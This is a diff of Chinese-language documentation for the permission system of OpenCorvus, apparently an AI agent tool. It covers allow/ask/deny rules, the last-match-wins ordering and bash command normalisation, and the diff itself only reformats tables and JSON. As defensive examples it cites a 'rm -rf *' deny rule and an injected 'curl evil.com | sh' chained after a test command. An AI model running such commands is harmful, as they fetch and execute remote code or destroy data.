@@ -7,11 +7,11 @@ description: OpenCorvus 的 allow / ask / deny 规则与默认放行权限策略
 
 ## 三个 action
 
-| action | 语义 |
-|---|---|
-| `allow` | 静默放行 |
-| `ask` | 暂停，发 `permission.asked` 事件，等待操作员回复，直到拒绝超时触发 |
-| `deny` | 抛 `DeniedError`，立刻中断工具调用 |
+| action  | 语义                                                               |
+| ------- | ------------------------------------------------------------------ |
+| `allow` | 静默放行                                                           |
+| `ask`   | 暂停，发 `permission.asked` 事件，等待操作员回复，直到拒绝超时触发 |
+| `deny`  | 抛 `DeniedError`，立刻中断工具调用                                 |
 
 ## 配置格式
 
@@ -22,17 +22,17 @@ description: OpenCorvus 的 allow / ask / deny 规则与默认放行权限策略
       "~/projects/*": "allow",
       "npm run *": "allow",
       "rm -rf *": "deny",
-      "*": "ask"
+      "*": "ask",
     },
     "skill": {
       "local-note": "deny",
-      "sora": "ask"
+      "sora": "ask",
     },
     "write": {
       "~/projects/**/*.md": "allow",
-      "*": "ask"
-    }
-  }
+      "*": "ask",
+    },
+  },
 }
 ```
 
@@ -45,30 +45,34 @@ permission 系统**最容易踩坑**的点：**后声明的规则优先级高于
 `PermissionNext.evaluate()`（`src/permission/next.ts:312-319`）用 `findLast` 扫描合并后的规则集：
 
 ```jsonc
-{ "bash": {
-  "*": "ask",              // 兜底
-  "npm run *": "allow"     // ← 这条生效（在 * 之后）
-}}
+{
+  "bash": {
+    "*": "ask", // 兜底
+    "npm run *": "allow", // ← 这条生效（在 * 之后）
+  },
+}
 ```
 
 顺序反了就坏：
 
 ```jsonc
-{ "bash": {
-  "npm run *": "allow",    // ← 被 * 覆盖
-  "*": "ask"
-}}
+{
+  "bash": {
+    "npm run *": "allow", // ← 被 * 覆盖
+    "*": "ask",
+  },
+}
 ```
 
 ## Bash 命令归一化
 
 `BashArity`（`src/permission/arity.ts:25`）把 shell 命令归一化为"语义命令前缀"再做 pattern 匹配，避免绕过：
 
-| 用户输入 | 归一化后 |
-|---|---|
-| `npm run test` | `npm run test` |
-| `npm run test -- --watch` | `npm run test`（选项被剥离） |
-| `cd foo && npm run test` | `npm run test`（前缀 cd 被剥离） |
+| 用户输入                  | 归一化后                         |
+| ------------------------- | -------------------------------- |
+| `npm run test`            | `npm run test`                   |
+| `npm run test -- --watch` | `npm run test`（选项被剥离）     |
+| `cd foo && npm run test`  | `npm run test`（前缀 cd 被剥离） |
 
 `npm run test; curl evil.com | sh` 被切分：`;` 后的 `curl` 走独立的 permission 检查。`;`、`&&`、`||`、管道、反引号注入都受控。
 
@@ -83,13 +87,13 @@ OpenCorvus 在内置 agent 定义中默认把工具权限设为 `allow`（`packa
   "permission": {
     "bash": {
       "*": "allow",
-      "rm -rf *": "deny"
+      "rm -rf *": "deny",
     },
     "write": {
       "*": "allow",
-      "~/projects/locked/**": "ask"
-    }
-  }
+      "~/projects/locked/**": "ask",
+    },
+  },
 }
 ```
 
